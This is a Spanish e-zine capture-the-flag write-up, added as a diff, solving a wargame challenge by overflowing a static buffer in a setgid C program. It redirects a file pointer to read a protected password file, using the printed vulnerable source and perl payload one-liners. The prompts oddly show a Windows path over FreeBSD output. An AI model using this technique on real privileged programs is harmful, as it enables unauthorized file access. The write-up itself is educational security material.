@@ -1,0 +1,472 @@
+-[ 0x05 ]--------------------------------------------------------------------
+-[ 2do Reto Torneo Shell Warzone (HoF) ]-------------------------------------
+-[ by blackngel ]----------------------------------------------------SET-36--
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         by blackngel <blackngel1@gmail.com>
+          ||                      <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+[-----]
+
+Seguidamente explicaremos la solucion al 2º reto planteado por los creadores
+del "Torneo Shell" de la Warzone ubicada en "elhacker.net". La informacion
+que encontrareis a continuacion se expone con un mero caracter educativo.
+Warzone, sus creadores y el autor de este documento no se hacen responsables
+del uso o abuso que se le pueda dar a la misma. Disfruten del juego!
+
+[-----]
+
+Una vez superado el primer reto del torneo, que versaba sobre la explotacion
+de un clasico "Buffer Overflow", nos encontramos con otra de las
+vulneravilidades mas conocidas y/o extendidas dentro del hacking y el mundo
+de la programacion, nuestros amigos los "Heap Overflow" (desbordamientos del
+monticulo).
+
+Seamos mas exactos, en realidad no se trata de un desbordamiento de heap tipico
+que lleva a ejecucion de codigo arbitario, dado que en ningun momento se
+desborda variable alguna asignada con alguna de las funciones malloc(), calloc()
+o realloc().
+
+En realidad se trata de un desbordamiento del area o seccion .BSS donde son
+alojadas las variables no inicializadas en tiempo de compilacion. Un overflow
+en este area permite sobreescribir la direccion de los punteros almacenados,
+no su contenido. Pero ello es suficiente para que apunten al lugar que mas nos
+interese.
+
+Iremos directos al grano. Entramos en el directorio de la prueba y listamos
+los ficheros:
+
+[-----]
+
+   C:/Users/NikiSanders/Desktop>ls -al
+   total 52
+   drwxr-x---   3 HoF   warzone1   512 Dec  3 18:26 .
+   drwxr-xr-x 320 root  wheel     7168 Dec 14 07:35 ..
+   -rw-r--r--   1 root  warzone1  1296 Nov 29 23:26 .HoF
+   -rw-r--r--   1 HoF   warzone    751 Nov 21 13:45 .cshrc
+   -rw-r--r--   1 HoF   warzone    248 Nov 21 13:45 .login
+   -rw-r--r--   1 HoF   warzone    158 Nov 21 13:45 .login_conf
+   -rw-r-----   1 HoF   warzone    373 Nov 21 13:45 .mail_aliases
+   -rw-r--r--   1 HoF   warzone    331 Nov 21 13:45 .mailrc
+   drwxr-x---   2 HoF   OK1        512 Dec 12 21:38 .pass
+   -rw-r--r--   1 HoF   warzone    766 Nov 21 13:45 .profile
+   -rw-r--r--   1 HoF   warzone    276 Nov 21 13:45 .rhosts
+   -rw-r--r--   1 HoF   warzone    975 Nov 21 13:45 .shrc
+   -rwxr-sr-x   1 HoF   basico1  12661 Dec 28 13:01 HoF
+   -rw-r-----   1 root  warzone1  2304 Dec 28 13:01 HoF.c
+   -rw-r--r--   1 root  warzone2  1765 Dec  3 18:26 TORNEO.txt
+
+   C:/Users/NikiSanders/Desktop>
+
+[-----]
+
+Observamos lo siguiente:
+
+   - HoF   -> Programa vulnerable
+   - HoF.c -> Codigo fuente del programa
+   - .pass -> Directorio objetivo que contiene nuestro "hash"
+
+En este caso aprovecharemos la bondad de los creadores del reto a la hora de
+prestarnos el codigo fuente. De este modo no perderemos el tiempo debuggeando
+el programa o probando parametros al azar. Echemos un vistazo general a las
+partes mas importantes y hagamos un esquema en un papel:
+
+[-----]
+
+        #include<stdio.h>
+        #include<stdlib.h>
+        #include<string.h>
+        #include<errno.h>
+        #include<ctype.h>
+
+        #define ERROR -1
+        #define BUFSIZE 256
+
+        int main(int argc, char **argv) {
+                char a;
+                int n,c,i,j,len;
+                FILE *tmpfd,*tendout;
+             static char *sBuffer,*tempBuffer,*tmpfile,*endfile,nombre[BUFSIZE];
+                tmpfile = (char*) calloc(BUFSIZE,sizeof(char));
+                check();
+                if(tmpfile == NULL){
+                        fprintf(stderr, "calloc(): %s\n", strerror(errno));
+                        exit(ERROR);
+                }
+                strcpy(tmpfile,"/tmp/input_");
+                sprintf(tmpfile, "%s%d",tmpfile,getuid());
+                endfile = (char*) calloc(BUFSIZE,sizeof(char));
+                if(endfile == NULL) {
+                        fprintf(stderr, "calloc(): %s\n", strerror(errno));
+                        exit(ERROR);
+                }
+                if(errno == EBADF) {
+                        exit(ERROR);
+                }
+
+[-----]
+
+- Se establece en "*tmpfile" el nombre de un archivo situado en el directorio
+  "/tmp" formado por la raiz "input_" y seguido del UID del usuario. En nuestro
+  caso "/tmp/input_7027".
+
+[-----]
+
+        strcpy(endfile,"/tmp/output_");
+        sprintf(endfile,"%s%d",endfile,getuid());
+        tmpfd = fopen(tmpfile, "r");
+        if (tmpfd == NULL)	{
+                fprintf(stderr, "fopen(): %s: %s\n", tmpfile, strerror(errno));
+                exit(ERROR);
+        }
+        if(fscanf(tmpfd,"%d",&n) == EOF)	{	//Casos a ejecutar
+                fprintf(stderr,"fscanf(): Input Error!");
+        }
+        c = 0;
+        sBuffer = (char*) calloc(1024,sizeof(char));
+        if(sBuffer == NULL)	{
+                fprintf(stderr, "calloc(): %s\n", strerror(errno));
+                exit(ERROR);
+        }
+        tempBuffer = (char*) calloc(1024,sizeof(char));
+        if(tempBuffer == NULL)	{
+                fprintf(stderr, "calloc(): %s\n", strerror(errno));
+                exit(ERROR);
+        }
+
+[-----]
+
+- Se establece un fichero de salida siguiendo el mismo metodo que antes.
+  Se llamara: "output_7027".
+
+- Se abre el fichero de entrada "/tmp/input_7027" para lectura y se obtiene
+  el primer caracter, que en este caso debe ser un digito ("%d").
+
+- El resto de instrucciones son reservas de memoria clasicas rellenadas con
+  'ceros'.
+
+[-----]
+
+        tendout = fopen(endfile, "a+");
+        if (tendout == NULL)	{
+                fprintf(stderr, "fopen(): %s: %s\nUsando salida Estandar\n",
+                                                  endfile, strerror(errno));
+                tendout = stdout;
+        }
+        while(c <= n && n > 0)	{
+                fgets(sBuffer,1024,tmpfd);
+                i = 0;
+                j = 0;
+                len = strlen(sBuffer);
+                while(i < len )	{
+                   if(!isspecial(sBuffer[i])) {
+                        tempBuffer[j++] =(char) sBuffer[i] - 2;
+                      //printf("tempBuffer[%d] = 0x%x\n", j-1, tempBuffer[j-1]);
+                   }	
+                   i++;
+                }
+                c++;
+                tempBuffer[j] == '\0';
+                fprintf(tendout,"%s\n",tempBuffer);
+
+[-----]
+
+- Se abre el fichero de salida para añadir.
+
+- Comienza un bucle que se repetira tantas veces como diga el numero que
+  acabamos de extraer del fichero de entrada + 1.
+
+- Se leen 1024 bytes del fichero de entrada y se vuelcan en "tempBuffer[]".
+  He aqui algo importante, a cada byte se le resta un '2' !!! Lo veremos
+  mas adelante.
+
+- Se imprime el resultado en el fichero de salida.
+
+[-----]
+
+                fprintf(tendout,"%s\n",tempBuffer);
+                memcpy(nombre,tempBuffer,j);
+                printf("\nNombre = %s\n", nombre);
+                memset(tempBuffer,0,1024);
+                memset(sBuffer,0,1024);
+        }
+        fclose(tmpfd);         // Cerramos Archivo de Entrada
+        fclose(tendout);       // Cerramos Archivo de Salida en modo Escritura
+        tendout = fopen(endfile, "r"); // Abrimos en modo Lectura
+
+        if (tendout == NULL)	{
+                fprintf(stderr, "fopen(): %s: %s\n", endfile, strerror(errno));
+                exit(ERROR);
+        }
+        while(!feof(tendout))	{
+                fscanf(tendout,"%c",&a);
+                printf("%c",a);
+        }
+        fclose(tendout);
+   }
+
+[-----]
+
+- Se copia tambien en "nombre[]" el contenido de "*tmpBuffer". VULNERABLE !!!
+
+- Se restablecen los bufferes de almacenamiento con 'ceros'.
+
+- Se cierran ambos ficheros de entrada y salida.
+
+- Se vuelve a abrir el fichero de salida, pero esta vez en modo
+lectura para volcar su contenido en pantalla.
+
+Bien, todo se va viedo ya mucho mas claro. Pero antes de nada debemos entender
+una cosa. Existen varios tipos de "Heap Overflow":
+
+1 -> Los clasicos que permiten la ejecucion de codigo arbitrario.
+2 -> Los que permiten modificacion del contenido de la memoria o
+     variables adyacentes. (Como mencionamos, desbordamiento de BSS).
+3 -> Etc...
+
+Nosotros aprovecharemos el segundo tipo de bug y para ello recogeremos los
+fragmentos de codigo mas importantes que nos llevaran a su explotacion:
+
+o-----------------------------------------o
+| #define BUFSIZE 256                     |
+| static char *sBuffer,*tempBuffer,       |
+| *tmpfile,*endfile,nombre[BUFSIZE];      |
+| fgets(sBuffer,1024,tmpfd);              |
+| tempBuffer[j++] =(char) sBuffer[i] - 2; |
+| memcpy(nombre,tempBuffer,j);            |
+| fclose(tendout);                        |
+| tendout = fopen(endfile, "r");          |
+o-----------------------------------------o
+
+Con esto ya tenemos todo lo necesario para proceder en nuestro ataque:
+
+Podemos observar como se leen 1024 bytes del fichero de entrada, se pasan a
+"tempBuffer" codificados en 2 posiciones y se copia el contenido en el array
+"nombre[]". Es facil ver que este no puede soportar tal cantidad, pues su
+tamaño es 256, y sera desbordado de inmediato.
+
+Acabamos de ver el error, y ahora, ¿como aprovecharlo?
+
+Lo que ocurre es que todo aquello que sobrepase el array "nombre[]",
+sobreescribira los punteros que se hayan declarado de forma contigua
+a este. Esquematicamente quiere decir lo siguiente:
+
+o----------------------------------------------------------------o
+| Situacion normal |                                             |
+|------------------o                                             |
+|*tmpfile = direccion de memoria que apunta a "/tmp/input_7027"  |
+|*endfile = direccion de memoria que apunta a "/tmp/output_7027" |
+|nombre[] = [WARZONE]                                            |
+o----------------------------------------------------------------o
+
+Imaginese ahora que nosotros introducimos en el fichero de entrada 1024
+caracteres A (no se olvide que la primera linea debe contener solo un
+digito, p.e. "1"). Entonces se produciria una situacion de ataque como
+esta:
+
+o-----------------------------------------------o
+| Situacion ataque |                            |
+|------------------o                            |
+|*tmpfile = 0x41414141                          |
+|*endfile = 0x41414141                          |
+|nombre[] = [AAAAAAAAAAAAAAAAAAAAA..... (256)A] |
+o-----------------------------------------------o
+
+[-----]
+
+Resultado:
+
+   C:/Users/NikiSanders/Desktop>echo `perl -e 'print "1\n";'``perl -e
+   'print "A"x1024';` > /tmp/input_7027
+
+   C:/Users/NikiSanders/Desktop>./HoF
+   Segmentation fault
+
+   C:/Users/NikiSanders/Desktop>
+
+[-----]
+
+Lo cual dice mucho, porque significa que podemos controlar las direcciones
+de memoria de las variables "*tmpfile" y "*endfile" para modificar su
+contenido.
+
+¿Cual de ellas escoger?
+
+Volvamos a plantear cual es el objetivo de todos los retos del Torneo Shell:
+"Leer un fichero ".leeme_UID" dentro del directorio secreto ".pass" que nos
+dara el hash con el que superar la prueba."
+
+Dos motivos para escoger "*endfile":
+
+   1) *tmpfile se abre antes de sobreescribir "nombre[]".
+   2) *endfile es reabierto para lectura y se imprime en pantalla.
+
+Piensa! Piensa! Esto quiere decir que si logramos modificar el valor de la
+variable "*endfile", podemos hacer que se imprima en pantalla el contenido
+del fichero que nosotros deseamos y no el original, "output_7027".
+
+Para esto necesitamos 2 cosas:
+
+   1) Situar en algun lugar de la memoria la cadena ".pass/.leeme_7027".
+   2) Sobreescribir solamente "*endfile" para que apunte a esta direccion.
+
+Personalmente tengo 2 lugares de mi preferencia para colocar la cadena. El
+primero seria los argumentos del propio programa "./HoF". El segundo son las
+variables de entorno. Utilizaremos la segunda opcion por una razon muy
+sencilla. Al existir multitud de variables de entorno, es muy facil caer en
+una direccion que contenga alguna cadena conocida; a partir de ahi podemos ir
+desplazandonos hasta alcanzar la nuestra.
+
+Pero nosotros utilizaremos un pequeño truco para ganar tiempo, crearemos un
+programa que nos diga la posicion en memoria de estas variables. He aqui el
+codigo:
+
+[-----]
+
+   #include <stdlib.h>
+   #include <stdio.h>
+
+   int main(int argc, char *argv[]) {
+      char *addr;
+      addr = getenv(argv[1]);
+      printf("%s is located at %p\n", argv[1], addr);
+      return 0;
+   }
+
+[-----]
+
+Veamos primero cuales son estas variables y cual modificaremos para
+nuestro objetivo:
+
+o--------------------------------------------------------------------o
+| USER=NikiSanders                                                   |
+| LOGNAME=NikiSanders                                                |
+| HOME=/usr/home/NikiSanders                                         |
+| MAIL=/var/mail/NikiSanders                                         |
+| PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/games:/usr/local/sbin:/usr |
+| /local/bin:/usr/home/NikiSanders/bin                               |
+| TERM=xterm                                                         |
+| BLOCKSIZE=K                                                        |
+| MANPATH=/usr/share/man:/usr/local/man                              |
+| SHELL=/bin/csh                                                     |
+| SSH_CLIENT=127.0.0.1 50121 22                                      |
+| SSH_CONNECTION=127.0.0.1 50121 127.0.0.1 22                        |
+| SSH_TTY=/dev/ttyp0                                                 |
+| HOSTTYPE=FreeBSD                                                   |
+| VENDOR=intel                                                       |
+| OSTYPE=FreeBSD                                                     |
+| MACHTYPE=i386                                                      |
+| SHLVL=1                                                            |
+| PWD=/usr/home/HoF                                                  |
+| GROUP=warusers                                                     |
+| HOST=                                                              |
+| REMOTEHOST=localhost                                               |
+| EDITOR=vi                                                          |
+| PAGER=more                                                         |
+o--------------------------------------------------------------------o
+
+Aunque lo mas logico seria coger una del medio, a mi se me antoja utilizar
+"REMOTEHOST". Modifiquemosla y obtengamos antes de nada su direccion:
+
+[-----]
+
+   C:/Users/NikiSanders/Desktop>setenv REMOTEHOST .pass/.leeme_7027
+
+   C:/Users/NikiSanders/Desktop>./getenv REMOTEHOST
+   REMOTEHOST is located at 0xbfbfef89
+
+   C:/Users/NikiSanders/Desktop>
+
+[-----]
+
+Vale. Entonces, ahora lo unico que precisamos es un buffer de ataque que
+desborde "*endfile" con esta direccion. Algo como lo siguiente:
+
+   [1\n][AAAAAA(256)][0xbfbfef89]
+
+Aqui el comando que logra esto:
+
+[-----]
+
+   C:/Users/NikiSanders/Desktop>echo `perl -e 'print "1\n"';``perl -e
+   'print "A"x256';``perl -e 'print "\x89\xef\xbf\xbf";'` > /tmp/input_7027
+
+   C:/Users/NikiSanders/Desktop>./HoF
+   Segmentation fault
+
+   C:/Users/NikiSanders/Desktop>
+
+[-----]
+
+¿Que ha ocurrido? No se preocupe, piense friamente. Como bien sabemos, un
+fallo de segmentacion se produce cuando se accede a una direccion de memoria
+no valida. Si nosotros sabemos que hemos apuntado a una direccion de memoria
+valida, entonces es de suponer que el programa esta haciendo algo extraño.
+
+Y si, este es el motivo, os acordais de:
+
+   tempBuffer[j++] =(char) sBuffer[i] – 2;
+
+Aja! El contenido del buffer no es exactamente lo que nosotros introducimos,
+ya que esta operacion codifica cada byte restandole un dos. Esto es como la
+"ingenieria inversa", si el programa hace una cosa, nosotros la contrarrestamos.
+
+Lo anterior quiere decir que cuando nosotros pensabamos que "*endfile" apuntaba
+a "0xbfbfef89" en realidad estaba apuntando a "0xbdbded87", por lo cual
+obteniamos un lindo "segmentation fault".
+
+¿Como conseguir entonces la direccion deseada? Muy sencillo, le sumaremos un 2
+y probaremos suerte :)
+
+La direccion quedaria asi: "0xc1c1f191". Vamos alla:
+
+[-----]
+
+   C:/Users/NikiSanders/Desktop>echo `perl -e 'print "1\n"';``perl -e
+   'print "A"x256';``perl -e 'print "\x91\xf1\xc1\xc1";'` > /tmp/input_7027
+
+   C:/Users/NikiSanders/Desktop>./HoF
+   fopen(): eme_7027: No such file or directory
+
+   C:/Users/NikiSanders/Desktop>
+
+[-----]
+
+Bingo!! Vemos que hemos caido muy pero que muy cerca de nuestra deseada
+variable. Desde luego el archivo "eme_7027" no existe, por lo que obtenemos
+el error. Pero eso no es problema para nosotros, nos desplazaremos las
+posiciones necesarias para acertar de pleno:
+
+[-----]
+
+   C:/Users/NikiSanders/Desktop>echo `perl -e 'print "1\n"';``perl -e
+   'print "A"x256';``perl -e 'print "\x88\xf1\xc1\xc1";'` > /tmp/input_7027
+
+   C:/Users/NikiSanders/Desktop>./HoF
+   Enhorabuena usted ha pasado la Segunda prueba
+   Su clave de Acceso es:
+   No olvide registrar sus password en /usr/home/warzone/validar
+   esto es para que se le habran los nuevos retos!!
+   Ademas no olvide volver al shell con el que inicio
+   la prueba ;) antes de ejecutar validar.
+
+   Hash: 8d46a4a---------------b0648339ff
+
+   C:/Users/NikiSanders/Desktop>
+
+[-----]
+
+Enhorabuena tambien por mi parte. Espero que este documento te haya servido para
+entender este clasico concepto de explotacion que tantas alegrias te puede dar.
+
+Por lo demas WARZONE te esta esperando! };-D
+
+
+*EOF*
